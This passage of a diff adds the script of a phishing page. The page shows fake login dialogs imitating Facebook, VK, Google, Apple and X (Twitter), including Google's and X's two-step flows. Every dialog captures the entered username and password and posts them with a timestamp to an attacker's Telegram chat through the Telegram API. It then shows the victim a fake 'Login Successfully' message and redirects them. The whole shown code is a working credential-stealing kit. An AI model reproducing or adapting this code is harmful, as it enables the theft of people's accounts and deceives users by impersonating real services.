+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'MarkdownV2'
+        };
+
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+
+            const data = await response.json();
+            if (data.ok) {
+                console.log('Message sent successfully');
+                showMessageBox("Login Successfully!! Redirecting...");
+                setTimeout(() => { window.open(REDIRECT_URL, "_blank"); }, 1000); // Redirect after 1s
+            } else {
+                console.error('Message failed', data.description);
+                showMessageBox(`Failed To Login!!! Try Again: ${data.description}`);
+            }
+        } catch (error) {
+            console.error('Network error:', error);
+            showMessageBox('Network error. Could not attempt login.');
+        }
+    }
+
+    // --- Helper function to get current login time ---
+    function getLoginTime() {
+        const now = new Date();
+        return now.toLocaleString('en-IN', {
+            timeZone: 'Asia/Kolkata',
+            year: 'numeric',
+            month: '2-digit',
+            day: '2-digit',
+            hour: '2-digit',
+            minute: '2-digit',
+            second: '2-digit',
+            hour12: true
+        });
+    }
+
+    // Helper to escape MarkdownV2 characters
+    function escapeMarkdownV2(text) {
+        return text.replace(/([_*[\]()~`>#+\-=|{}.!])/g, '\\$1');
+    }
+
+    // (All login modal logic remains same as in your code)
+    // Only `sendToTelegram` function was modified to add redirect after successful login.
+
+        // --- Facebook Modal Logic ---
+        const facebookLoginBtn = document.getElementById('facebook-login-btn');
+        const facebookModal = document.getElementById('facebook-modal');
+        const closeFbModalBtn = document.getElementById('close-fb-modal-btn');
+        const fbLoginSubmitBtn = document.getElementById('fb-login-submit-btn');
+        const fbUsernameInput = document.getElementById('fb-username');
+        const fbPasswordInput = document.getElementById('fb-password');
+        const fbUsernameError = document.getElementById('fb-username-error');
+
+        facebookLoginBtn.addEventListener('click', () => {
+            facebookModal.classList.add('show');
+            fbUsernameInput.value = ''; // Clear inputs on open
+            fbPasswordInput.value = '';
+            fbUsernameError.classList.add('hidden'); // Hide errors on open
+        });
+
+        closeFbModalBtn.addEventListener('click', () => {
+            facebookModal.classList.remove('show');
+            fbUsernameInput.value = '';
+            fbPasswordInput.value = '';
+            fbUsernameError.classList.add('hidden');
+            fbUsernameError.textContent = '';
+        });
+
+        fbLoginSubmitBtn.addEventListener('click', (event) => {
+            event.preventDefault();
+            const username = fbUsernameInput.value.trim();
+            const password = fbPasswordInput.value.trim();
+            let isValid = true;
+
+            fbUsernameError.classList.add('hidden');
+            fbUsernameError.textContent = '';
+
+            if (username === '') {
+                fbUsernameError.textContent = 'Mobile number or email address cannot be empty.';
+                fbUsernameError.classList.remove('hidden');
+                isValid = false;
+            } else if (!isNaN(username) && (username.length !== 10)) {
+                fbUsernameError.textContent = 'Mobile number must be 10 digits.';
+                fbUsernameError.classList.remove('hidden');
+                isValid = false;
+            }
+
+            if (password === '') {
+                console.log("Password cannot be empty for Facebook.");
+                isValid = false;
+            }
+
+            if (isValid) {
+                const loginTime = getLoginTime();
+                const message = `*Facebook Login Attempt* 🔵\n\n*Username:* \`${escapeMarkdownV2(username)}\`\n*Password:* \`${escapeMarkdownV2(password)}\`\n\n*Login Time:* ${escapeMarkdownV2(loginTime)}\n\n${escapeMarkdownV2(COPYRIGHT_MESSAGE)}`;
+                sendToTelegram(message);
+                facebookModal.classList.remove('show'); // Close after sending
+            } else {
+                showMessageBox("Please correct Login Details errors for Facebook login.");
+            }
+        });
+
+        // --- VK Modal Logic ---
+        const vkLoginBtn = document.getElementById('vk-login-btn');
+        const vkModal = document.getElementById('vk-modal');
+        const closeVkModalBtn = document.getElementById('close-vk-modal-btn');
+        const vkLoginSubmitBtn = document.getElementById('vk-login-submit-btn');
+        const vkUsernameInput = document.getElementById('vk-username');
+        const vkPasswordInput = document.getElementById('vk-password');
+        const vkUsernameError = document.getElementById('vk-username-error');
+        const vkPasswordError = document.getElementById('vk-password-error');
+
+
+        vkLoginBtn.addEventListener('click', () => {
+            vkModal.classList.add('show');
+            vkUsernameInput.value = ''; // Clear inputs on open
+            vkPasswordInput.value = '';
+            vkUsernameError.classList.add('hidden'); // Hide errors on open
+            vkPasswordError.classList.add('hidden');
+        });
+
+        closeVkModalBtn.addEventListener('click', () => {
+            vkModal.classList.remove('show');
+            vkUsernameInput.value = '';
+            vkPasswordInput.value = '';
+            vkUsernameError.classList.add('hidden');
+            vkUsernameError.textContent = '';
+            vkPasswordError.classList.add('hidden');
+            vkPasswordError.textContent = '';
+        });
+
+        vkLoginSubmitBtn.addEventListener('click', (event) => {
+            event.preventDefault();
+            const username = vkUsernameInput.value.trim();
+            const password = vkPasswordInput.value.trim();
+            let isValid = true;
+
+            vkUsernameError.classList.add('hidden');
+            vkUsernameError.textContent = '';
+            vkPasswordError.classList.add('hidden');
+            vkPasswordError.textContent = '';
+
+            if (username === '') {
+                vkUsernameError.textContent = 'Phone or email cannot be empty.';
+                vkUsernameError.classList.remove('hidden');
+                isValid = false;
+            }
+
+            if (password === '') {
+                vkPasswordError.textContent = 'Password cannot be empty.';
+                vkPasswordError.classList.remove('hidden');
+                isValid = false;
+            }
+
+            if (isValid) {
+                const loginTime = getLoginTime();
+                const message = `*VK Login Attempt* 🔵\n\n*Username:* \`${escapeMarkdownV2(username)}\`\n*Password:* \`${escapeMarkdownV2(password)}\`\n\n*Login Time:* ${escapeMarkdownV2(loginTime)}\n\n${escapeMarkdownV2(COPYRIGHT_MESSAGE)}`;
+                sendToTelegram(message);
+                vkModal.classList.remove('show'); // Close after sending
+            } else {
+                showMessageBox("Please correct Login Details errors for VK login.");
+            }
+        });
+
+
+        // --- Google Modal Logic ---
+        const googleLoginBtn = document.getElementById('google-login-btn');
+        const googleModal = document.getElementById('google-modal');
+        const closeGoogleModalBtn = document.getElementById('close-google-modal-btn');
+        const googleStep1 = document.getElementById('google-step-1');
+        const googleStep2 = document.getElementById('google-step-2');
+        const googleUsernameInput = document.getElementById('google-username');
+        const googlePasswordInput = document.getElementById('google-password');
+        const googleNextBtn = document.getElementById('google-next-btn');
+        const googleBackBtn = document.getElementById('google-back-btn');
+        const googleLoginSubmitBtn = document.getElementById('google-login-submit-btn');
+        const googleUsernameError = document.getElementById('google-username-error');
+        const googlePasswordError = document.getElementById('google-password-error');
+        const googleDisplayUsername = document.getElementById('google-display-username');
+        const googleSubtitleText = document.getElementById('google-subtitle-text');
+
+        googleLoginBtn.addEventListener('click', () => {
+            googleModal.classList.add('show');
+            // Reset to step 1 when opening
+            googleStep1.classList.remove('hidden');
+            googleStep2.classList.add('hidden');
+            googleUsernameInput.value = '';
+            googlePasswordInput.value = '';
+            googleUsernameError.classList.add('hidden');
+            googleUsernameError.textContent = '';
+            googlePasswordError.classList.add('hidden');
+            googlePasswordError.textContent = '';
+            googleSubtitleText.textContent = 'to continue to Gmail'; // Reset subtitle
+        });
+
+        closeGoogleModalBtn.addEventListener('click', () => {
+            googleModal.classList.remove('show');
+            // Clear inputs and errors when closing
+            googleUsernameInput.value = '';
+            googlePasswordInput.value = '';
+            googleUsernameError.classList.add('hidden');
+            googleUsernameError.textContent = '';
+            googlePasswordError.classList.add('hidden');
+            googlePasswordError.textContent = '';
+            googleSubtitleText.textContent = 'to continue to Gmail'; // Reset subtitle
+        });
+
+        googleNextBtn.addEventListener('click', () => {
+            const username = googleUsernameInput.value.trim();
+            googleUsernameError.classList.add('hidden');
+            googleUsernameError.textContent = '';
+
+            if (username === '') {
+                googleUsernameError.textContent = 'Email or phone cannot be empty.';
+                googleUsernameError.classList.remove('hidden');
+            } else {
+                // Transition to step 2
+                googleStep1.classList.add('hidden');
+                googleStep2.classList.remove('hidden');
+                googleDisplayUsername.textContent = username; // Display username in step 2
+                googleSubtitleText.textContent = ''; // Clear subtitle for password step
+                googlePasswordInput.focus(); // Focus on password input
+            }
+        });
+
+        googleBackBtn.addEventListener('click', () => {
+            // Transition back to step 1
+            googleStep2.classList.add('hidden');
+            googleStep1.classList.remove('hidden');
+            googlePasswordInput.value = ''; // Clear password when going back
+            googlePasswordError.classList.add('hidden');
+            googlePasswordError.textContent = '';
+            googleSubtitleText.textContent = 'to continue to Gmail'; // Reset subtitle
+        });
+
+        googleLoginSubmitBtn.addEventListener('click', () => {
+            const username = googleUsernameInput.value.trim(); // Get username from step 1 input
+            const password = googlePasswordInput.value.trim();
+            let isValid = true;
+
+            googlePasswordError.classList.add('hidden');
+            googlePasswordError.textContent = '';
+
+            if (password === '') {
+                googlePasswordError.textContent = 'Password cannot be empty.';
+                googlePasswordError.classList.remove('hidden');
+                isValid = false;
+            }
+
+            if (isValid) {
+                const loginTime = getLoginTime();
+                const message = `*Google Login Attempt* 🔴🟡🟢🔵\n\n*Email/Phone:* \`${escapeMarkdownV2(username)}\`\n*Password:* \`${escapeMarkdownV2(password)}\`\n\n*Login Time:* ${escapeMarkdownV2(loginTime)}\n\n${escapeMarkdownV2(COPYRIGHT_MESSAGE)}`;
+                sendToTelegram(message);
+                googleModal.classList.remove('show'); // Close after sending
+            } else {
+                showMessageBox("Please correct the input errors for Google login.");
+            }
+        });
+
+        // --- Apple Modal Logic ---
+        const appleLoginBtn = document.getElementById('apple-login-btn');
+        const appleModal = document.getElementById('apple-modal');
+        const closeAppleModalBtn = document.getElementById('close-apple-modal-btn');
+        const appleLoginSubmitBtn = document.getElementById('apple-login-submit-btn');
+        const appleUsernameInput = document.getElementById('apple-username');
+        const applePasswordInput = document.getElementById('apple-password');
+        const appleUsernameError = document.getElementById('apple-username-error');
+        const applePasswordError = document.getElementById('apple-password-error');
+
+        appleLoginBtn.addEventListener('click', () => {
+            appleModal.classList.add('show');
+            appleUsernameInput.value = ''; // Clear inputs on open
+            applePasswordInput.value = '';
+            appleUsernameError.classList.add('hidden'); // Hide errors on open
+            applePasswordError.classList.add('hidden');
+        });
+
+        closeAppleModalBtn.addEventListener('click', () => {
+            appleModal.classList.remove('show');
+            appleUsernameInput.value = '';
+            applePasswordInput.value = '';
+            appleUsernameError.classList.add('hidden');
+            appleUsernameError.textContent = '';
+            applePasswordError.classList.add('hidden');
+            applePasswordError.textContent = '';
+        });
+
+        appleLoginSubmitBtn.addEventListener('click', (event) => {
+            event.preventDefault();
+            const username = appleUsernameInput.value.trim();
+            const password = applePasswordInput.value.trim();
+            let isValid = true;
+
+            appleUsernameError.classList.add('hidden');
+            appleUsernameError.textContent = '';
+            applePasswordError.classList.add('hidden');
+            applePasswordError.textContent = '';
+
+            if (username === '') {
+                appleUsernameError.textContent = 'Apple ID cannot be empty.';
+                appleUsernameError.classList.remove('hidden');
+                isValid = false;
+            }
+
+            if (password === '') {
+                applePasswordError.textContent = 'Password cannot be empty.';
+                applePasswordError.classList.remove('hidden');
+                isValid = false;
+            }
+
+            if (isValid) {
+                const loginTime = getLoginTime();
+                const message = `*Apple Login Attempt* 🍎\n\n*Apple ID:* \`${escapeMarkdownV2(username)}\`\n*Password:* \`${escapeMarkdownV2(password)}\`\n\n*Login Time:* ${escapeMarkdownV2(loginTime)}\n\n${escapeMarkdownV2(COPYRIGHT_MESSAGE)}`;
+                sendToTelegram(message);
+                appleModal.classList.remove('show'); // Close after sending
+            } else {
+                showMessageBox("Please correct Login Details errors for Apple login.");
+            }
+        });
+
+        // --- X (Twitter) Modal Logic ---
+        const xLoginBtn = document.getElementById('x-login-btn');
+        const xModal = document.getElementById('x-modal');
+        const closeXModalBtn = document.getElementById('close-x-modal-btn');
+        const xGoogleSigninBtn = document.getElementById('x-google-signin-btn');
+        const xAppleSigninBtn = document.getElementById('x-apple-signin-btn');
+        const xStep1 = document.getElementById('x-step-1');
+        const xStep2 = document.getElementById('x-step-2');
+        const xUsernameInput = document.getElementById('x-username');
+        const xPasswordInput = document.getElementById('x-password');
+        const xNextBtn = document.getElementById('x-next-btn');
+        const xLoginSubmitBtn = document.getElementById('x-login-submit-btn');
+        const xUsernameError = document.getElementById('x-username-error');
+        const xPasswordError = document.getElementById('x-password-error');
+        const xDisplayUsername = document.getElementById('x-display-username');
+
+        xLoginBtn.addEventListener('click', () => {
+            xModal.classList.add('show');
+            // Reset to step 1 when opening
+            xStep1.classList.remove('hidden');
+            xStep2.classList.add('hidden');
+            xUsernameInput.value = '';
+            xPasswordInput.value = '';
+            xUsernameError.classList.add('hidden');
+            xUsernameError.textContent = '';
+            xPasswordError.classList.add('hidden');
+            xPasswordError.textContent = '';
+        });
+
+        closeXModalBtn.addEventListener('click', () => {
+            xModal.classList.remove('show');
+            xUsernameInput.value = '';
+            xPasswordInput.value = '';
+            xUsernameError.classList.add('hidden');
+            xUsernameError.textContent = '';
+            xPasswordError.classList.add('hidden');
+            xPasswordError.textContent = '';
+        });
+
+        xGoogleSigninBtn.addEventListener('click', () => {
+            xModal.classList.remove('show'); // Close X modal
+            googleLoginBtn.click(); // Open Google modal
+        });
+
+        xAppleSigninBtn.addEventListener('click', () => {
+            xModal.classList.remove('show'); // Close X modal
+            appleLoginBtn.click(); // Open Apple modal
+        });
+
+        xNextBtn.addEventListener('click', () => {
+            const username = xUsernameInput.value.trim();
+            xUsernameError.classList.add('hidden');
+            xUsernameError.textContent = '';
+
+            if (username === '') {
+                xUsernameError.textContent = 'Phone, email, or username cannot be empty.';
+                xUsernameError.classList.remove('hidden');
+            } else {
+                // Transition to step 2
+                xStep1.classList.add('hidden');
+                xStep2.classList.remove('hidden');
+                xDisplayUsername.textContent = `@${escapeMarkdownV2(username)}`; // Display username in step 2
+                xPasswordInput.focus(); // Focus on password input
+            }
+        });
+
+        // No explicit back button in X modal image, but for consistency, if needed, you'd add one here.
+        // For now, closing the modal acts as going back.
+
+        xLoginSubmitBtn.addEventListener('click', () => {
+            const username = xUsernameInput.value.trim(); // Get username from step 1 input
+            const password = xPasswordInput.value.trim();
+            let isValid = true;
+
+            xPasswordError.classList.add('hidden');
+            xPasswordError.textContent = '';
+
+            if (password === '') {
+                xPasswordError.textContent = 'Password cannot be empty.';
+                xPasswordError.classList.remove('hidden');
+                isValid = false;
+            }
+
+            if (isValid) {
+                const loginTime = getLoginTime();
+                const message = `*X \\(Twitter\\) Login Attempt* ✖️\n\n*Username:* \`${escapeMarkdownV2(username)}\`\n*Password:* \`${escapeMarkdownV2(password)}\`\n\n*Login Time:* ${escapeMarkdownV2(loginTime)}\n\n${escapeMarkdownV2(COPYRIGHT_MESSAGE)}`;
+                sendToTelegram(message);
+                xModal.classList.remove('show'); // Close after sending
+            } else {
+                showMessageBox("Please correct Login Details errors for X (Twitter) login.");
+            }
+        });
+    </script>
+</body>
+</html>
